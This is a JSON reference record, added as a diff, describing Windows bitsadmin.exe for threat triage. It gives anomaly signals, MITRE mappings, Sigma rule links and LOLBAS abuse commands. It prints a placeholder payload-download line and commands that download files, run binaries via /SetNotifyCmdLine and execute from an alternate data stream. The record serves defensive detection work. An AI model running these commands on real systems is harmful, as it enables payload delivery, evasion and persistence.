@@ -1,0 +1,532 @@
+{
+  "name": "bitsadmin.exe",
+  "aliases": [
+    "bitsadmin"
+  ],
+  "category": "Utility",
+  "tags": [
+    "microsoft",
+    "core-windows",
+    "lolbin"
+  ],
+  "description": "bitsadmin.exe is a command-line tool for creating and managing BITS (Background Intelligent Transfer Service) jobs, which download or upload files in the background through a Windows service. Windows Update and many installers rely on BITS to fetch data resiliently. Microsoft has deprecated bitsadmin in favor of PowerShell, but attackers still use it to download payloads and to run a command when a transfer finishes.\n",
+  "about": "bitsadmin.exe drives the Background Intelligent Transfer Service, the Windows component that moves files in the background using spare bandwidth and survives reboots and dropped connections. BITS is the machinery behind much of Windows Update and software delivery. The genuine binary lives at `C:\\Windows\\System32\\bitsadmin.exe`. Microsoft deprecated it in favour of the PowerShell BITS cmdlets (`Start-BitsTransfer`), so newer scripts increasingly use those instead.\n\nA job is built up in steps: `/create` makes it, `/addfile` attaches a source URL and a local destination, and `/resume` starts the transfer. Two details matter for triage. The transfer itself is carried out by the BITS service inside `svchost.exe`, not by bitsadmin, so the network connection comes from the service rather than the tool. And `/SetNotifyCmdLine` attaches a command that BITS runs when the job completes.\n\nLegitimately, bitsadmin is uncommon on a normal desktop, because the BITS service does its work without anyone invoking the command-line tool. Its parent and the job it builds on the command line are what give an instance meaning.\n",
+  "publisher": null,
+  "issuer": null,
+  "signed": null,
+  "signing_rate": null,
+  "signing_algorithm": null,
+  "signers": [],
+  "file_details": null,
+  "file_versions": [],
+  "file_sizes": [],
+  "cert_thumbprints": [],
+  "provenance": "curated",
+  "prevalence_band": "unknown",
+  "prevalence_score": null,
+  "host_prevalence": null,
+  "execution_rank": null,
+  "community_score": null,
+  "first_seen": null,
+  "last_seen": null,
+  "machine_count": null,
+  "execution_count": null,
+  "expected_paths": [],
+  "expected_parents": [],
+  "expected_children": [],
+  "expected_grandparents": [],
+  "expected_grandchildren": [],
+  "network_ports": [],
+  "listening_ports": [],
+  "network_destinations": [],
+  "loaded_modules": [],
+  "named_pipes": [],
+  "user_contexts": [],
+  "integrity_levels": [],
+  "sessions": [],
+  "instance_counts": [],
+  "token_privileges": [],
+  "process_handles": [],
+  "os_prevalence": [],
+  "anomaly_signals": [
+    {
+      "signal": "Image path other than `C:\\Windows\\System32\\bitsadmin.exe`",
+      "severity": "high"
+    },
+    {
+      "signal": "`/transfer` or `/addfile` with an `http`/`https` URL",
+      "severity": "high"
+    },
+    {
+      "signal": "`/SetNotifyCmdLine` attaching a command to a job",
+      "severity": "high"
+    },
+    {
+      "signal": "Parent is an Office application, `cmd.exe`, `powershell.exe`, `wscript.exe`, `cscript.exe`, or `mshta.exe`",
+      "severity": "high"
+    },
+    {
+      "signal": "A job downloading to a user-writable path (`Temp`, `AppData`, `Downloads`)",
+      "severity": "high"
+    },
+    {
+      "signal": "Long-lived, suspended, or oddly named BITS jobs left on the system",
+      "severity": "medium"
+    }
+  ],
+  "command_lines": [],
+  "known_hashes": [],
+  "security_notes": "bitsadmin.exe is a stealthy download tool (T1105, T1197). A line like `bitsadmin /transfer job https://host/payload C:\\Users\\Public\\p.exe` pulls a file through the BITS service, which blends with normal update traffic and resumes across reboots. Crucially, the connection is made by `svchost.exe` hosting BITS, not by bitsadmin, so a network-centric view misses the origin entirely.\n\nIts real signature technique is BITS Jobs (T1197). `/SetNotifyCmdLine` tells BITS to run a program when a job finishes, which lets an attacker chain a download to execution, or stand up a long-lived or recurring job as persistence that re-runs their command. The job lives in the BITS database rather than an obvious autostart location, so it survives reboots and evades the usual persistence checks.\n\nIn every case the binary is the genuine signed bitsadmin, the work hides behind a legitimate background service, and the activity resembles an ordinary update. The command-line verbs (`/transfer`, `/addfile`, `/SetNotifyCmdLine`) and the parent are where the intent shows.\n",
+  "mitre_attack": [
+    "T1197",
+    "T1105"
+  ],
+  "technique_matching": "strict",
+  "references": [
+    "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin",
+    "https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/",
+    "https://attack.mitre.org/techniques/T1197/",
+    "https://attack.mitre.org/techniques/T1105/"
+  ],
+  "lolbas": {
+    "url": "https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/",
+    "commands": [
+      {
+        "command": "bitsadmin /create 1 bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1",
+        "usecase": "Performs execution of specified file in the alternate data stream, can be used as a defensive evasion or persistence technique.",
+        "mitreID": "T1564.004",
+        "category": "ADS"
+      },
+      {
+        "command": "bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\\data\\playfolder\\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1",
+        "usecase": "Download file from Internet",
+        "mitreID": "T1105",
+        "category": "Download"
+      },
+      {
+        "command": "bitsadmin /create 1 & bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset",
+        "usecase": "Copy file",
+        "mitreID": "T1105",
+        "category": "Copy"
+      },
+      {
+        "command": "bitsadmin /create 1 & bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset",
+        "usecase": "Execute binary file specified. Can be used as a defensive evasion.",
+        "mitreID": "T1218",
+        "category": "Execute"
+      }
+    ]
+  },
+  "sigma": [
+    {
+      "id": "846b866e-2a57-46ee-8e16-85fa92759be7",
+      "title": "Exploited CVE-2020-10189 Zoho ManageEngine",
+      "level": "high",
+      "techniques": [
+        "T1190",
+        "T1059.001",
+        "T1059.003"
+      ],
+      "url": "https://github.com/SigmaHQ/sigma/blob/master/rules-emerging-threats/2020/Exploits/CVE-2020-10189/proc_creation_win_exploit_cve_2020_10189.yml",
+      "match": "image"
+    },
+    {
+      "id": "2ddef153-167b-4e89-86b6-757a9e65dcac",
+      "title": "File Download Via Bitsadmin To A Suspicious Target Folder",
+      "level": "high",
+      "techniques": [
+        "T1197",
+        "T1036.003",
+        "T1105"
+      ],
+      "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_bitsadmin_download_susp_targetfolder.yml",
+      "match": "image"
+    },
+    {
+      "id": "5b80a791-ad9b-4b75-bcc1-ad4e1e89c200",
+      "title": "File With Suspicious Extension Downloaded Via Bitsadmin",
+      "level": "high",
+      "techniques": [
+        "T1197",
+        "T1036.003",
+        "T1105"
+      ],
+      "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_bitsadmin_download_susp_extensions.yml",
+      "match": "image"
+    },
+    {
+      "id": "0fdc7c7f-c690-4217-9ae3-31f5156eed72",
+      "title": "Potential Exploitation of CrushFTP RCE Vulnerability (CVE-2025-54309)",
+      "level": "high",
+      "techniques": [
+        "T1059.001",
+        "T1059.003",
+        "T1068",
+        "T1190"
+      ],
+      "url": "https://github.com/SigmaHQ/sigma/blob/master/rules-emerging-threats/2025/Exploits/CVE-2025-54309/proc_creation_win_exploit_cve_2025_54309.yml",
+      "match": "image"
+    },
+    {
+      "id": "69bd9b97-2be2-41b6-9816-fb08757a4d1a",
+      "title": "Potentially Suspicious Execution From Parent Process In Public Folder",
+      "level": "high",
+      "techniques": [
+        "T1564",
+        "T1059"
+      ],
+      "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_execution_from_public_folder_as_parent.yml",
+      "match": "image"
+    },
+    {
+      "id": "9f38c1db-e2ae-40bf-81d0-5b68f73fb512",
+      "title": "Suspicious BitLocker Access Agent Update Utility Execution",
+      "level": "high",
+      "techniques": [
+        "T1218",
+        "T1021.003"
+      ],
+      "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_baaupdate_susp_child_process.yml",
+      "match": "image"
+    },
+    {
+      "id": "cea2b7ea-792b-405f-95a1-b903ea06458f",
+      "title": "Suspicious Child Process Of Manage Engine ServiceDesk",
+      "level": "high",
+      "techniques": [
+        "T1102"
+      ],
+      "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_java_manageengine_susp_child_process.yml",
+      "match": "image"
+    },
+    {
+      "id": "869b9ca7-9ea2-4a5a-8325-e80e62f75445",
+      "title": "Suspicious Child Process Of SQL Server",
+      "level": "high",
+      "techniques": [
+        "T1505.003",
+        "T1190"
+      ],
+      "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_mssql_susp_child_process.yml",
+      "match": "image"
+    },
+    {
+      "id": "99c840f2-2012-46fd-9141-c761987550ef",
+      "title": "Suspicious Download From Direct IP Via Bitsadmin",
+      "level": "high",
+      "techniques": [
+        "T1197",
+        "T1036.003"
+      ],
+      "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_bitsadmin_download_direct_ip.yml",
+      "match": "image"
+    },
+    {
+      "id": "8518ed3d-f7c9-4601-a26c-f361a4256a0c",
+      "title": "Suspicious Download From File-Sharing Website Via Bitsadmin",
+      "level": "high",
+      "techniques": [
+        "T1197",
+        "T1036.003",
+        "T1105"
+      ],
+      "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_bitsadmin_download_file_sharing_domains.yml",
+      "match": "image"
+    },
+    {
+      "id": "438025f9-5856-4663-83f7-52f878a70a50",
+      "title": "Suspicious Microsoft Office Child Process",
+      "level": "high",
+      "techniques": [
+        "T1047",
+        "T1204.002",
+        "T1218.010"
+      ],
+      "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_office_susp_child_processes.yml",
+      "match": "image"
+    },
+    {
+      "id": "c27515df-97a9-4162-8a60-dc0eeb51b775",
+      "title": "Suspicious Microsoft OneNote Child Process",
+      "level": "high",
+      "techniques": [
+        "T1566",
+        "T1566.001"
+      ],
+      "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_office_onenote_susp_child_processes.yml",
+      "match": "image"
+    },
+    {
+      "id": "03cc0c25-389f-4bf8-b48d-11878079f1ca",
+      "title": "Suspicious MSHTA Child Process",
+      "level": "high",
+      "techniques": [
+        "T1218.005"
+      ],
+      "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_mshta_susp_child_processes.yml",
+      "match": "image"
+    },
+    {
+      "id": "8202070f-edeb-4d31-a010-a26c72ac5600",
+      "title": "Suspicious Process By Web Server Process",
+      "level": "high",
+      "techniques": [
+        "T1505.003",
+        "T1190"
+      ],
+      "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_webshell_susp_process_spawned_from_webserver.yml",
+      "match": "image"
+    },
+    {
+      "id": "cbec226f-63d9-4eca-9f52-dfb6652f24df",
+      "title": "Suspicious Process Parents",
+      "level": "high",
+      "techniques": [
+        "T1036"
+      ],
+      "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_parents.yml",
+      "match": "parent"
+    },
+    {
+      "id": "0d34ed8b-1c12-4ff2-828c-16fc860b766d",
+      "title": "Suspicious Processes Spawned by Java.EXE",
+      "level": "high",
+      "techniques": [],
+      "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_java_susp_child_process.yml",
+      "match": "image"
+    },
+    {
+      "id": "5cc2cda8-f261-4d88-a2de-e9e193c86716",
+      "title": "Suspicious Processes Spawned by WinRM",
+      "level": "high",
+      "techniques": [
+        "T1190"
+      ],
+      "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_winrm_susp_child_process.yml",
+      "match": "image"
+    },
+    {
+      "id": "8823e85d-31d8-473e-b7f4-92da070f0fc6",
+      "title": "Suspicious ShellExec_RunDLL Call Via Ordinal",
+      "level": "high",
+      "techniques": [
+        "T1218.011"
+      ],
+      "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_rundll32_susp_shellexec_ordinal_execution.yml",
+      "match": "image"
+    },
+    {
+      "id": "90fb5e62-ca1f-4e22-b42e-cc521874c938",
+      "title": "Suspicious Shells Spawn by Java Utility Keytool",
+      "level": "high",
+      "techniques": [],
+      "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_java_keytool_susp_child_process.yml",
+      "match": "image"
+    },
+    {
+      "id": "dcdbc940-0bff-46b2-95f3-2d73f848e33b",
+      "title": "Suspicious Spool Service Child Process",
+      "level": "high",
+      "techniques": [
+        "T1203",
+        "T1068"
+      ],
+      "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_spoolsv_susp_child_processes.yml",
+      "match": "image"
+    },
+    {
+      "id": "e4a6b256-3e47-40fc-89d2-7a477edd6915",
+      "title": "System File Execution Location Anomaly",
+      "level": "high",
+      "techniques": [
+        "T1036"
+      ],
+      "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_system_exe_anomaly.yml",
+      "match": "image"
+    },
+    {
+      "id": "3a6586ad-127a-4d3b-a677-1e6eacdf8fde",
+      "title": "Windows Shell/Scripting Processes Spawning Suspicious Programs",
+      "level": "high",
+      "techniques": [
+        "T1059.005",
+        "T1059.001",
+        "T1218"
+      ],
+      "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_shell_spawn_susp_program.yml",
+      "match": "image"
+    },
+    {
+      "id": "271de298-cc0e-4842-acd8-079a0a99ea65",
+      "title": "Windows Suspicious Child Process from Node.js - React2Shell",
+      "level": "high",
+      "techniques": [
+        "T1059",
+        "T1190"
+      ],
+      "url": "https://github.com/SigmaHQ/sigma/blob/master/rules-emerging-threats/2025/Exploits/CVE-2025-55182/proc_creation_win_exploit_cve_2025_55182_susp_nodejs_server_child_process.yml",
+      "match": "image"
+    },
+    {
+      "id": "d059842b-6b9d-4ed1-b5c3-5b89143c6ede",
+      "title": "File Download Via Bitsadmin",
+      "level": "medium",
+      "techniques": [
+        "T1197",
+        "T1036.003",
+        "T1105"
+      ],
+      "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_bitsadmin_download.yml",
+      "match": "image"
+    },
+    {
+      "id": "b9cbbc17-d00d-4e3d-a827-b06d03d2380d",
+      "title": "Monitoring For Persistence Via BITS",
+      "level": "medium",
+      "techniques": [
+        "T1197"
+      ],
+      "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_bitsadmin_potential_persistence.yml",
+      "match": "image"
+    },
+    {
+      "id": "e4b6d2a7-d8a4-4f19-acbd-943c16d90647",
+      "title": "Potentially Suspicious PowerShell Child Processes",
+      "level": "medium",
+      "techniques": [
+        "T1059.001"
+      ],
+      "url": "https://github.com/SigmaHQ/sigma/blob/master/rules-threat-hunting/windows/process_creation/proc_creation_win_powershell_susp_child_processes.yml",
+      "match": "image"
+    },
+    {
+      "id": "7b582f1a-b318-4c6a-bf4e-66fe49bf55a5",
+      "title": "Remote Access Tool - ScreenConnect Potential Suspicious Remote Command Execution",
+      "level": "medium",
+      "techniques": [
+        "T1219.002"
+      ],
+      "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_remote_access_tools_screenconnect_remote_execution_susp.yml",
+      "match": "image"
+    },
+    {
+      "id": "5b304bcb-ac33-49d0-87af-fa1b3ca94333",
+      "title": "Suspicious Child Process of SAP NetWeaver",
+      "level": "medium",
+      "techniques": [
+        "T1190",
+        "T1059.003"
+      ],
+      "url": "https://github.com/SigmaHQ/sigma/blob/master/rules-emerging-threats/2025/Exploits/CVE-2025-31324/proc_creation_win_sap_netweaver_susp_child_process.yml",
+      "match": "image"
+    },
+    {
+      "id": "e700ff14-1bff-4d1d-9438-738dff5f0466",
+      "title": "BITS Client BitsProxy DLL Loaded By Uncommon Process",
+      "level": "low",
+      "techniques": [
+        "T1197"
+      ],
+      "url": "https://github.com/SigmaHQ/sigma/blob/master/rules-threat-hunting/windows/image_load/image_load_dll_bitsproxy_load_by_uncommon_process.yml",
+      "match": "image"
+    }
+  ],
+  "techniques": [
+    {
+      "id": "T1105",
+      "name": "Ingress Tool Transfer",
+      "curated": true,
+      "lolbas": true,
+      "tactics": [
+        {
+          "name": "Command and Control",
+          "order": 12
+        }
+      ]
+    },
+    {
+      "id": "T1197",
+      "name": "BITS Jobs",
+      "curated": true,
+      "lolbas": false,
+      "tactics": [
+        {
+          "name": "Stealth",
+          "order": 6
+        },
+        {
+          "name": "Persistence",
+          "order": 4
+        },
+        {
+          "name": "Execution",
+          "order": 3
+        }
+      ]
+    },
+    {
+      "id": "T1218",
+      "name": "System Binary Proxy Execution",
+      "curated": false,
+      "lolbas": true,
+      "tactics": [
+        {
+          "name": "Stealth",
+          "order": 6
+        }
+      ]
+    },
+    {
+      "id": "T1564.004",
+      "name": "Hide Artifacts: NTFS File Attributes",
+      "curated": false,
+      "lolbas": true,
+      "tactics": [
+        {
+          "name": "Stealth",
+          "order": 6
+        }
+      ]
+    }
+  ],
+  "triage": [
+    {
+      "signal": "Image path other than `C:\\Windows\\System32\\bitsadmin.exe`",
+      "severity": "high",
+      "source": "curated",
+      "signalHtml": "Image path other than <code>C:\\Windows\\System32\\bitsadmin.exe</code>"
+    },
+    {
+      "signal": "`/transfer` or `/addfile` with an `http`/`https` URL",
+      "severity": "high",
+      "source": "curated",
+      "signalHtml": "<code>/transfer</code> or <code>/addfile</code> with an <code>http</code>/<code>https</code> URL"
+    },
+    {
+      "signal": "`/SetNotifyCmdLine` attaching a command to a job",
+      "severity": "high",
+      "source": "curated",
+      "signalHtml": "<code>/SetNotifyCmdLine</code> attaching a command to a job"
+    },
+    {
+      "signal": "Parent is an Office application, `cmd.exe`, `powershell.exe`, `wscript.exe`, `cscript.exe`, or `mshta.exe`",
+      "severity": "high",
+      "source": "curated",
+      "signalHtml": "Parent is an Office application, <a class=\"proc-link\" href=\"/processes/cmd.exe\"><code>cmd.exe</code></a>, <a class=\"proc-link\" href=\"/processes/powershell.exe\"><code>powershell.exe</code></a>, <a class=\"proc-link\" href=\"/processes/wscript.exe\"><code>wscript.exe</code></a>, <a class=\"proc-link\" href=\"/processes/cscript.exe\"><code>cscript.exe</code></a>, or <a class=\"proc-link\" href=\"/processes/mshta.exe\"><code>mshta.exe</code></a>"
+    },
+    {
+      "signal": "A job downloading to a user-writable path (`Temp`, `AppData`, `Downloads`)",
+      "severity": "high",
+      "source": "curated",
+      "signalHtml": "A job downloading to a user-writable path (<code>Temp</code>, <code>AppData</code>, <code>Downloads</code>)"
+    },
+    {
+      "signal": "Long-lived, suspended, or oddly named BITS jobs left on the system",
+      "severity": "medium",
+      "source": "curated",
+      "signalHtml": "Long-lived, suspended, or oddly named BITS jobs left on the system"
+    }
+  ],
+  "about_html": "<p>bitsadmin.exe drives the Background Intelligent Transfer Service, the Windows component that moves files in the background using spare bandwidth and survives reboots and dropped connections. BITS is the machinery behind much of Windows Update and software delivery. The genuine binary lives at <code>C:\\Windows\\System32\\bitsadmin.exe</code>. Microsoft deprecated it in favour of the PowerShell BITS cmdlets (<code>Start-BitsTransfer</code>), so newer scripts increasingly use those instead.</p>\n<p>A job is built up in steps: <code>/create</code> makes it, <code>/addfile</code> attaches a source URL and a local destination, and <code>/resume</code> starts the transfer. Two details matter for triage. The transfer itself is carried out by the BITS service inside <a class=\"proc-link\" href=\"/processes/svchost.exe\"><code>svchost.exe</code></a>, not by bitsadmin, so the network connection comes from the service rather than the tool. And <code>/SetNotifyCmdLine</code> attaches a command that BITS runs when the job completes.</p>\n<p>Legitimately, bitsadmin is uncommon on a normal desktop, because the BITS service does its work without anyone invoking the command-line tool. Its parent and the job it builds on the command line are what give an instance meaning.</p>",
+  "security_notes_html": "<p>bitsadmin.exe is a stealthy download tool (<a href=\"https://attack.mitre.org/techniques/T1105/\" target=\"_blank\" rel=\"noreferrer noopener\">T1105</a>, <a href=\"https://attack.mitre.org/techniques/T1197/\" target=\"_blank\" rel=\"noreferrer noopener\">T1197</a>). A line like <code>bitsadmin /transfer job https://host/payload C:\\Users\\Public\\p.exe</code> pulls a file through the BITS service, which blends with normal update traffic and resumes across reboots. Crucially, the connection is made by <a class=\"proc-link\" href=\"/processes/svchost.exe\"><code>svchost.exe</code></a> hosting BITS, not by bitsadmin, so a network-centric view misses the origin entirely.</p>\n<p>Its real signature technique is BITS Jobs (<a href=\"https://attack.mitre.org/techniques/T1197/\" target=\"_blank\" rel=\"noreferrer noopener\">T1197</a>). <code>/SetNotifyCmdLine</code> tells BITS to run a program when a job finishes, which lets an attacker chain a download to execution, or stand up a long-lived or recurring job as persistence that re-runs their command. The job lives in the BITS database rather than an obvious autostart location, so it survives reboots and evades the usual persistence checks.</p>\n<p>In every case the binary is the genuine signed bitsadmin, the work hides behind a legitimate background service, and the activity resembles an ordinary update. The command-line verbs (<code>/transfer</code>, <code>/addfile</code>, <code>/SetNotifyCmdLine</code>) and the parent are where the intent shows.</p>"
+}
